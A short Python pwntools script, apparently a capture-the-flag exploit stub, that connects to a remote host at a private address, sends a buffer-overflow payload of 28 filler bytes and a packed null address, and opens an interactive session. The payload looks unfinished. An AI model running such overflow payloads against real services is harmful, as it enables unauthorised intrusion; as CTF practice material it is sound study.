from pwn import *

from LibcSearcher import *

p=remote('10.102.32.142',28612)
#p.recvuntil()
payload='a'*28+p64(0x0)
p.sendline(payload)

p.interactive()
